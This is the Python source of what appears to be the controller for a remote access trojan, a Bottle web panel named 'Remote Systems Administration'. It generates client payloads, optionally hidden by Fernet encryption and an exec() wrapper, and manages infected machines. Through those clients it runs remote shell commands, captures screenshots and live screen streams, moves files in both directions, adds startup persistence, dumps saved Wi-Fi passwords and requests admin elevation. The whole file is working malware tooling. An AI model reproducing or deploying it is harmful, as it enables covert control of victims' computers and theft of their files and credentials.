from cryptography.fernet import Fernet
from marshal import loads
from subprocess import Popen, PIPE
from bottle import Bottle, template, request, static_file, redirect, response
from socket import socket, error, gaierror
import os
from datetime import datetime
from threading import Thread
from win10toast import ToastNotifier
toaster = ToastNotifier()
# from email.mime import message, image, text, multipart, nonmultipart, base, audio


app = Bottle()
secret_key = 'key'  # Secret key to encrypt cookies
os.system("cls")
os.system("title Remote Systems Administration($) CREATED BY SHAIL")
print("Created By Shail")
status_listen = False
result = ""
down_dir = os.getcwd() + "\\downloads\\"
all_clients = {}
client_id = 0
share = False

def gen_key():
    print("Not any key found\nGenerated new ENCRYPTION key")
    key_file = "files\\ENCRYPTION.KEY"
    key = Fernet.generate_key()
    # key = "jwtU6dABBShoW0T6PGQP7d5mZDZjEUezwrDRmgjXr-g="
    open(key_file, 'w').write(key)


def get_key():
    key_file = "files\\ENCRYPTION.KEY"
    while True:
        if os.path.isfile(key_file):
            global cipher_suite
            key = open(key_file, 'r').read()
            cipher_suite = Fernet(key)
            return key
        else:
            gen_key()


# Function used for encrypting command
# Remember that encryption with incresae data size more than half
def encrypt_cmd(cmd):
    return cipher_suite.encrypt(cmd)


# Function used for decrypting command
def decrypt_response(response):
    try:
        return cipher_suite.decrypt(response)
    except:
        return


# Function used for adding header to data which tells
# that what is length of comming data
# format == [length of data under 10] + command
# It means you can send 9999999999 bytes or 9.9 GB of data
# For large data you can change size in my case it is 10 (DEFAULT)
# If you change size then don't forget to change this size in server side script
# And also don't forget to change in "recvall()" function
def sendall(conn, data):
    data = encrypt_cmd(data)
    data = "{:<10}".format(len(data)) + data
    conn.send(data)


# Function used for receiving all comming data using header
# Please set data_part receiving bytes upto 10 bytes
# so header can completely receive in my case it is "1024" bytes
def recvall(conn):
    new_data = True
    data = ""
    while True:
        data_part = conn.recv(1024 * 100000)
        if new_data:
            try:
                data_len = int(data_part[:10])
            except ValueError:
                return
            data_part = data_part[10:]
            new_data = False
        data += data_part
        if len(data) == data_len:
            break
    return decrypt_response(data)


# This function will bind and listen for connections
def bind_socket(host, port):
    global s
    global status_listen
    global listen_error
    s = socket()
    get_key()
    try:
        s.bind((host, port))
        s.listen(5)
        print("Listening ...... on ")
        print((host, port))
        status_listen = True
        listen_error = "Listening on " + host + ":" + str(port)
        accept_conn()
    except gaierror:
        listen_error = "Invalid Host or Port"


# This function will accept connections
def accept_conn():
    while True:
        global client_id
        global all_clients
        conn, address = s.accept()
        s.setblocking(1)  # prevents timeout
        username = recvall(conn)
        if username:
            new_client = (conn, address, username)
            all_clients[client_id] = new_client
            client_id += 1
            print("Found " + str(address))
            toaster.show_toast("Found", str(address))
        else:
            conn.close()
            toaster.show_toast("Found", str(address) + ", But Invalid Data")


# To get list and delete unconnected clients from list of connections
def list_conn():
    run = True
    while run:
        if not all_clients:
            break
        for cli in all_clients:
            client = all_clients[cli]
            try:
                conn = client[0]
                sendall(conn, 'a')
                recvall(conn)
                run = False
            except error:
                del all_clients[cli]
                run = True
                break
    clients = []
    for x, i in enumerate(all_clients):
        new = all_clients[i]
        clients.append((i, x, new[2], new[1][0], new[1][1]))
        # id, enumerate, username, host, port
    return clients


@app.route('/static/<filename:path>')
def static(filename):
    return static_file(filename, root='static/')


@app.route('/')
def index():
    mesg = ""
    if request.query.get('mesg'):
        mesg = request.query['mesg']
    return template("index", mesg=mesg)


@app.route('/listen', method="POST")
def listen():
    global listen_error
    listen_error = "a"
    host = request.forms['host']
    port = int(request.forms['port'])
    if not status_listen:
        Thread(target=bind_socket, args=(host, port)).start()
        while listen_error == "a":
            pass
        if listen_error == "Invalid Host or Port":
            return redirect("/?mesg=" + listen_error)
        return redirect("/clients?mesg=" + listen_error)
    else:
        return redirect("/clients?mesg=" + "I'm already listening on other host and port")


def encrypted_client(filename, client):
    imports = """from cryptography.fernet import Fernet
from socket import socket, error
import os
from subprocess import Popen, PIPE
from time import sleep
from pyautogui import screenshot
from shutil import make_archive, copy2
from marshal import dumps
import sys
import ctypes"""
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    client = cipher_suite.encrypt(client)
    client_enc = "%s\nkey = '%s'\ncipher_suite = Fernet(key)\n" % (imports, key)
    client_enc += "text = '%s'\nexec(cipher_suite.decrypt(text))" % (client)
    open(filename, "w").write(client_enc)


def plain_client(filename, client):
    open(filename, "w").write(client)


def payload(filename, crypt, host, port):
    client = open("files\\client.py", 'r').read()
    client = client.format(get_key(), ('"' + host + '"'), port)

    # key = "8bH85AgvjWkKw4IlhI8Va3qprLXec2dipzS_9loLOp8="
    # cipher_suite = Fernet(key)
    # client = open("files\\client.enc", 'r').read()
    # client = cipher_suite.decrypt(client).format(('"' + host + '"'), port)

    if crypt == 'crypt':
        encrypted_client(filename, client)
    else:
        plain_client(filename, client)


@app.route('/create_client', method="POST")
def create_client():
    host = request.forms['host']
    filename = "clients\\" + request.forms['filename'] + ".py"
    port = int(request.forms['port'])
    crypt = request.forms['crypt']
    payload(filename, crypt, host, port)
    mesg = ("Your client File has been released --> " + filename)
    return redirect('/?mesg=' + mesg)


@app.route('/clients')
def clients():
    if status_listen:
        mesg = ""
        if request.query.get('mesg'):
            mesg = request.query['mesg']
        while True:
            try:
                clients = list_conn()
                break
            except Exception as msg:
                print(msg)
                continue
        return template("clients", clients=clients, mesg=mesg)
    return redirect("/?mesg=I'm not Listenning")


@app.route('/close/<num>')
def close(num):
    if num.isdigit():
        num = int(num)
        if (num in all_clients):
            try:
                conn = all_clients[num][0]
                sendall(conn, ("close()"))
                result = "Connection has been closed"
            except error:
                result = "Connection was already closed"
        else:
            result = "Invalid close"
    elif num == "all":
        try:
            for client in all_clients:
                conn = all_clients[client][0]
                sendall(conn, "close()")
        except error:
            pass
        result = "Connections has been closed"
    else:
        result = "Invalid close"
    return redirect('/clients?mesg=' + result)


def check_use(num):
    list_conn()
    return (num in all_clients)


@app.route('/use/<num:int>')
def use(num):
    mesg = ""
    if request.query.get('mesg'):
        mesg = request.query['mesg']
    response.set_cookie("num", num, secret="key")
    if check_use(num):
        return template("% rebase('use_base.html', title='USE')", mesg=mesg)
    return redirect('/clients')


def execute_shell(cmd):
    result = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    result = (result.stdout.read() + result.stderr.read())
    return result


@app.route('/use/shell', method=['GET', 'POST'])
def shell():
    num = request.get_cookie('num', secret="key")
    if check_use(num):
        global result
        if request.method == 'POST':
            cmd = request.forms['cmd']
            if cmd.startswith("server"):
                cmd = cmd[7:]
                result += execute_shell(cmd) + "\n"
            elif ("cls" in cmd) or ("clear" in cmd):
                result = ""
            else:
                conn = all_clients[num][0]
                sendall(conn, cmd)
                result += recvall(conn) + ">\n"
        return template('use/shell', result=result, mesg="", footer="footer")
    return redirect('/clients')


@app.route('/use/screenshot', method=['GET', 'POST'])
def screenshot():
    num = request.get_cookie('num', secret="key")
    if check_use(num):
        shot_path = "views\\use\\screenshots\\"
        mesg = ""
        if request.method == 'POST':
            shot_name = shot_path + request.forms['name'] + ".png"
            conn = all_clients[num][0]
            sendall(conn, "screenshot")
            shot = recvall(conn)
            try:
                open(shot_name, "wb").write(shot)
            except IOError:
                mesg = "Invalid Name"
        dirs = os.listdir(shot_path)
        dirs = [(i, x) for i, x in enumerate(dirs)]
        return template('use/screenshot', mesg=mesg, dirs=dirs)
    return redirect('/clients')


@app.route('/<action>/screenshot/<name>')
def screenshot_get(action, name):
    shot_path = 'views\\use\\screenshots\\'
    if action == "get":
        return static_file(name, root=shot_path)
    elif action == "del":
        if name == "all":
            for i in os.listdir(shot_path):
                os.remove(shot_path + i)
        else:
            os.remove(shot_path + name)
        return redirect('/use/screenshot')


@app.route('/use/attach_startup')
def attach_startup():
    num = request.get_cookie('num', secret="key")
    if check_use(num):
        conn = all_clients[num][0]
        sendall(conn, "attach_startup")
        response = recvall(conn)
        print(response)
        return redirect(('/use/{}?mesg={}').format(num, response))
    return redirect('/clients')


@app.route('/use/download/file')
def download_file():
    num = request.get_cookie('num', secret=secret_key)
    if check_use(num):
        conn = all_clients[num][0]
        sendall(conn, 'list_dir')
        response = recvall(conn).split('||=shail=||')
        list_dir = response[:-1]
        cwd = response[-1]
        return template('use/download', list_dir=list_dir, mesg=cwd)
    return redirect('/clients')


def get_drives(num):
    conn = all_clients[num][0]
    sendall(conn, 'list drives')
    drives = recvall(conn)
    drives = drives.replace('\n', '')
    drives = drives.split(' ')
    drives.pop()
    drives.remove('Drives:')
    return drives


def takeSecond(elem):
    return elem[1]


@app.route('/use/file/manager', method=['GET', 'POST'])
def upload_file():
    dir_change_result = request.query.get('result')
    num = request.get_cookie('num', secret=secret_key)
    if check_use(num):
        conn = all_clients[num][0]
        if request.method == 'POST':
            upload = request.files.get('file')
            name = upload.filename.encode('utf-8')
            data = upload.file.read()
            print("Reading file complete")
            file_data = ("upload" + name + "||=shail=||" + data)
            print("sending")
            sendall(conn, (file_data))
            print("File sended and wating for response ...")
            response = recvall(conn)
            print(response)
        sendall(conn, 'list_dir')
        response = loads(recvall(conn))
        global list_dir
        list_dir = response[:-1]
        list_dir.sort(key=takeSecond)
        cwd = response[-1]
        drives = get_drives(num)
        if dir_change_result:
            cwd += "  " + dir_change_result
        return template('use/file manager', list_dir=list_dir, cwd=cwd, drives=drives)
    return redirect('/clients')


@app.route('/use/get')
def get():
    global down_dir
    cli_dir = request.query.get('dir')
    num = request.get_cookie('num', secret=secret_key)
    if check_use(num):
        conn = all_clients[num][0]
        if cli_dir.isdigit():
            cli_dir = int(cli_dir)
            wanted = list_dir[cli_dir]
            sendall(conn, 'get ' + wanted[0])
            if wanted[1] == 'f':
                data = recvall(conn)
                if data[0] == "not found":
                    print("Not Any File Found ...")
                else:
                    try:
                        with open(down_dir + wanted[0], "wb") as f:
                            f.write(data)
                            print("File Has Been Received")
                    except IOError:
                        print("Something went wrong... or No such file or directory ...")
            elif wanted[1] == 'd':
                print(recvall(conn))
        elif cli_dir:
            sendall(conn, ('get ' + cli_dir))
            print(recvall(conn))
        return redirect('/use/file/manager')
    return redirect('/clients')


@app.route('/use/change/download', method=['POST'])
def chek_downloads():
    down_dir_get = str(request.forms.get('dir')).encode('utf-8')
    if os.path.isdir(down_dir_get):
        global down_dir
        down_dir = down_dir_get
        if not (down_dir.endswith('\\') or down_dir.endswith('/')):
            down_dir += "\\"
        result = "Changed Successfully"
    else:
        result = "Directory Not Found"
    return redirect('/use/file/manager?result=' + result)


def gen_tasklist(num):
    conn = all_clients[num][0]
    sendall(conn, 'tasklist')
    tasks = recvall(conn)
    tasks = tasks.split('\n')[3:-1]
    for i in range(len(tasks)):
        tasks[i] = tasks[i].split()
        if 'Console' in tasks[i]:
            remove = 'Console'
        elif 'Services' in tasks[i]:
            remove = 'Services'
        tasks[i].remove(remove)
        del tasks[i][-3]
        tasks[i][-2] = tasks[i][-2] + ' ' + tasks[i][-1]
        del tasks[i][-1]

    for i in range(len(tasks)):
        name = []
        for x in range(len(tasks[i])):
            if not ((tasks[i][x].isdigit()) and (' K' in tasks[i][x + 1])):
                name.append(tasks[i][x])
            else:
                break
        name = ' '.join(name)
        tasks[i] = [name, tasks[i][-2], tasks[i][-1]]
    return tasks


@app.route('/use/extra')
def extra():
    num = request.get_cookie('num', secret=secret_key)
    mesg = request.query.get('mesg')
    if check_use(num):
        tasks = gen_tasklist(num)
        if mesg:
            return template('use/extra', tasks=tasks, mesg=mesg)
        return template('use/extra', tasks=tasks)
    return redirect('/clients')


@app.route('/use/task/kill/<pid:int>')
def task_kill(pid):
    num = request.get_cookie('num', secret=secret_key)
    if check_use(num):
        conn = all_clients[num][0]
        cmd = "taskkill /F /PID " + str(pid)
        sendall(conn, cmd)
        recvall(conn)
        return redirect('/use/extra')
    return redirect('/clients')


@app.route('/use/power', method=['POST'])
def power():
    num = request.get_cookie('num', secret=secret_key)
    if check_use(num):
        sec = int(request.forms['sec'])
        action = request.forms['action']
        if action == 'Shutdown':
            action = '/s'
        elif action == 'Restart':
            action = '/r'
        elif action == 'Log off':
            action = '/l'
        cmd = "shutdown /f {} /t {}".format(action, sec)
        conn = all_clients[num][0]
        sendall(conn, cmd)
        return redirect('/use/extra')
    return redirect('/clients')


@app.route('/use/dumpWiFi')
def dump_wifi():
    num = request.get_cookie('num', secret=secret_key)
    if check_use(num):
        conn = all_clients[num][0]
        sendall(conn, 'dump wifi')
        wifi = recvall(conn)
        tasks = gen_tasklist(num)
        return template('use/extra', wifi=wifi, tasks=tasks)
    return redirect('/clients')


@app.route('/use/runasadmin')
def runasadmin():
    num = request.get_cookie('num', secret=secret_key)
    if check_use(num):
        conn = all_clients[num][0]
        sendall(conn, 'runasadmin')
        response = recvall(conn)
        return redirect('/use/extra?mesg=%s' % (response))
    return redirect('/clients')


@app.route('/use/screen/share')
def screen_share():
    num = request.get_cookie('num', secret=secret_key)
    if check_use(num):
        client = all_clients[num]
        data = (client[1][0], client[2], datetime.now())
        screen = template('use/screenshare', data=data, num=num).replace('\r', '')
        open("static\\screen.html", 'w').write(screen)
        return redirect('/static/screen.html')
    return redirect('/clients')


@app.route('/use/screen/share/start')
def screen_share_start():
    global share
    if share:
        return "<center><h1>Already Sharing<br>CLOSE THIS TAB</h1></center>"
    share = True
    num = request.get_cookie('num', secret=secret_key)
    if check_use(num):
        shot_name = "static\\saw6DfjiGwgh%d.png" % (num)
        conn = all_clients[num][0]
        while share:
            sendall(conn, 'screenshot')
            shot = recvall(conn)
            open(shot_name, 'wb').write(shot)
        return redirect('/use/%d' % (num))
    return redirect('/clients')


@app.route('/use/screen/share/stop')
def screen_share_stop():
    global share
    share = False
    num = request.get_cookie('num', secret=secret_key)
    if check_use(num):
        return redirect("/use/%d" % (num))
    return redirect('/clients')


if __name__ == '__main__':
    host, port = open('files\\server.txt', 'r').read().split(':')
    if not host:
        host = "127.0.0.1"
    print("\n------------------------------")
    print("OPEN http://%s:%s" % (host, port))
    print("------------------------------\n")
    from waitress import serve
    serve(app, host=host, port=int(port), threads=6)
    # run(app, host="127.0.0.1", port=80, debug=True, reloader=True)
